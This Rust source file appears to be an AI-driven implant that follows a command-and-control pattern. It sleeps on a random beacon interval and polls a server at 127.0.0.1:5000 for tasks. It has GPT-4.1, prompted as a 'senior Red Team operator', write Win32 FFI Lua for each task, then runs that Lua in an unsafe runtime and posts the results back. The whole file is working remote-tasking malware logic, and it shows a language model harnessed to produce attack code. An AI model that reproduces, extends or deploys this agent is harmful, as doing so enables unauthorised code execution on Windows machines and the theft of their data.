use std::{collections::HashMap, error::Error, thread, time::Duration};

use dotenvy::dotenv;
use mlua::{Lua, StdLib};
use openai_api_rs::v1::{api::OpenAIClient, chat_completion::{self, ChatCompletionChoice, ChatCompletionMessage, ChatCompletionRequest, ChatCompletionResponse}};
use rand::{rngs::ThreadRng, seq::IndexedRandom};
use reqwest::{header::{self, HeaderMap, HeaderValue}, Client, Response};
use serde::Deserialize;

#[derive(Deserialize)]
struct Chat {
    message: String,
}

const DEBUG: bool = true;


#[tokio::main]
async fn main() {
    dotenv().unwrap();

    let jitter: [u64; 7] = [61, 31, 45, 120, 92, 240, 301];
    let mut rng: ThreadRng = rand::rng();
    let duration: &u64 = jitter.choose(&mut rng).unwrap();
    println!("Duration: {duration}");

    let sleep_dur: Duration = Duration::from_secs(*duration);

    let mut prev_instruction: String = String::new();

    loop {
        println!("=== Dormant ===");
        thread::sleep(sleep_dur);

        let instruction: String = get_instruction().await;
        if instruction == prev_instruction {
            continue;
        }
        println!("**** Processing Task ****");

        prev_instruction = instruction.clone();

        let attempts: i32 = 1;

        let result: String = ai_gen_lua(&instruction, attempts).await;

        if DEBUG {
            println!("Lua result: {result}");
        }

        send_result(&result, attempts).await;

    }

}

async fn ai_gen_lua(instruction: &String, mut attempts: i32) -> String {
    match ai_execute(instruction).await {
        Ok(r) => {
            return String::from(r);
        },
        Err(e) => {
            if attempts < 3 {
                println!("Error: {e}");
                println!("Error encountered. Retrying {attempts}/3");
                attempts += 1;
                return Box::pin(ai_gen_lua(instruction, attempts)).await;
            } 
            return String::from("Fatal error generating Lua");
        }
    }
}

async fn ai_execute(instruction: &String) -> Result<String, Box<dyn Error>> {
    let api_key: String = dotenvy::var("OPENAI_API_KEY").unwrap();

    let mut client: OpenAIClient = OpenAIClient::builder().with_api_key(api_key).build().unwrap();

    let prompt: &str = r#"
You are a senior Red Team operator and expert Lua developer. Your task is to output a Lua script to accomplish the given objective, designed to run with LuaJIT on a Windows system. The script uses Lua's Foreign Function Interface (FFI) with the `ffi` variable already available (do not include `local ffi = require("ffi")`). All FFI calls must use the `ffi.C` convention (e.g., `ffi.C.CreateFileA`).

### Requirements
- **Accuracy and Error-Free Code**: The script must be syntactically correct, semantically accurate, and free of runtime errors. Prioritize precision over speed. Try to accomplish the task in pure Lua, but you have Win32 API available via C and Lua's FFI if needed.
- **Type Safety and Definition Order**:
  - Define all C types before use. No type may be referenced before its definition. This includes structs. For example, `WIN32_FIND_DATAW` struct contains a `FILETIME` struct type. Define the `FILETIME` struct first before `WIN32_FIND_DATAW`.
  - Include the following comprehensive list of C types at the top of the script in `ffi.cdef[[]]` when needed for Windows API calls. Add additional types only if required, ensuring they are defined before use:
  ```
  typedef unsigned char BYTE;
  typedef unsigned char* PBYTE;
  typedef unsigned char* LPBYTE;
  typedef int16_t SHORT;
  typedef uint16_t USHORT;
  typedef uint16_t WORD;
  typedef int32_t INT;
  typedef uint32_t UINT;
  typedef int32_t LONG;
  typedef uint32_t ULONG;
  typedef uint32_t DWORD;
  typedef int64_t LONGLONG;
  typedef uint64_t ULONGLONG;
  typedef size_t SIZE_T;
  typedef ptrdiff_t LONG_PTR;
  typedef ptrdiff_t SSIZE_T;
  typedef unsigned short wchar_t;
  typedef char TCHAR;
  typedef char* PCHAR;
  typedef const char* PCSTR;
  typedef char* PSTR;
  typedef char* LPSTR;
  typedef const char* LPCSTR;
  typedef wchar_t* PWCHAR;
  typedef const wchar_t* PCWSTR;
  typedef wchar_t* PWSTR;
  typedef wchar_t* LPWSTR;
  typedef const wchar_t* LPCWSTR;
  typedef void* PVOID;
  typedef void* LPVOID;
  typedef void* HANDLE;
  typedef void* HWND;
  typedef int32_t BOOL;
  typedef uint64_t ULONG_PTR;
  typedef DWORD (*LPTHREAD_START_ROUTINE)(LPVOID);
  ```
  - Before using any type in an FFI call, verify it is defined in the list above or explicitly added. If an undefined type is needed, include its definition first and update the type list.
- **Type Dependency Validation**: Ensure no type is used before its dependencies are defined (e.g., `LPCSTR` requires `char`, `LPWSTR` requires `wchar_t`). Cross-check every FFI declaration against the type list.
- **Windows Compatibility**: Ensure all API calls are compatible with Windows. Use `ffi.C` for Windows API functions (e.g., `ffi.C.CreateFileA`).
- **Naming and Scoping**: Use clear, consistent variable names (e.g., `hFile` for file handles). Declare all variables with `local` to avoid global scope pollution.
- **Output**: Store the script's output in a string variable named `result`. Return `result` at the end of the script.
- **Constraints**:
  - Do not include comments, explanations, or thought processes in the output.
  - Do not wrap the script in markdown or code fences.
  - Output only the run-ready Lua script.
- **Development Process**:
  1. Analyze the task requirements step by step.
  2. Try to accomplish the task in pure Lua if possible, but use the FFI library when you need to.
  3. Define all necessary C types, ensuring dependencies are resolved (e.g., define `char` before `LPCSTR`).
  4. Verify that every type used in FFI calls is defined in the type list.
  5. Optimize for LuaJIT (e.g., minimize memory allocations, use FFI efficiently).
  6. Set the `result` variable with the final output or an error message if validation fails.

The script must execute without errors, with all types defined before use, and produce the expected output for the given task.
    "#;

    let system_message: ChatCompletionMessage = ChatCompletionMessage {
        role: chat_completion::MessageRole::system,
        content: chat_completion::Content::Text(prompt.to_string()),
        name: None,
        tool_calls: None,
        tool_call_id: None
    };

    let user_message: ChatCompletionMessage = ChatCompletionMessage {
        role: chat_completion::MessageRole::user,
        content: chat_completion::Content::Text(instruction.to_string()),
        name: None,
        tool_calls: None,
        tool_call_id: None
    };
    
    let req: ChatCompletionRequest = ChatCompletionRequest::new(
        String::from("gpt-4.1-2025-04-14"),
        vec![
            system_message,
            user_message
        ]
    );

    let result: ChatCompletionResponse = client.chat_completion(req).await?;

    let choice: &ChatCompletionChoice = &result.choices[0];
    let generated_lua: String = choice.message.content.to_owned().unwrap();

    if DEBUG {
        println!("{generated_lua}");
    }

    let result: String = process_lua(generated_lua)?;

    return Ok(result);
}

fn process_lua(script: String) -> Result<String, Box<dyn Error>> {
    unsafe {
        let lua: Lua = Lua::unsafe_new();
        lua.load_std_libs(StdLib::ALL).unwrap();

        let result: String = lua.load(script).eval::<String>()?;

        return Ok(result)
    }
}

fn set_headers() -> HeaderMap {
    let luai_api_key: String = dotenvy::var("LUAI_API_KEY").unwrap();

    let mut headers: HeaderMap = HeaderMap::new();

    let auth_value: String = format!("Bearer {luai_api_key}");
    let mut auth_header: HeaderValue = HeaderValue::from_str(auth_value.as_str()).unwrap();
    auth_header.set_sensitive(true);

    headers.insert(header::AUTHORIZATION, auth_header);
    
    return headers;
}

async fn get_instruction() -> String {
    let headers: HeaderMap = set_headers();

    let client: Client = Client::builder().default_headers(headers).build().unwrap();

    let resp: Response = client.get("http://127.0.0.1:5000/get_message").send().await.unwrap();

    let chat: Chat = resp.json::<Chat>().await.unwrap();

    if DEBUG {
        println!("Instruction: {}", chat.message);
    }

    return chat.message;
}

async fn send_result(lua_result: &String, attempts: i32) {
    let headers: HeaderMap = set_headers();

    let client: Client = Client::builder().default_headers(headers).build().unwrap();

    let str_attempts: String = attempts.to_string();

    let mut map: HashMap<&str, &String> = HashMap::new();
    map.insert("message", lua_result);
    map.insert("attempts", &str_attempts);

    client.post("http://127.0.0.1:5000/reply").json(&map).send().await.unwrap();
}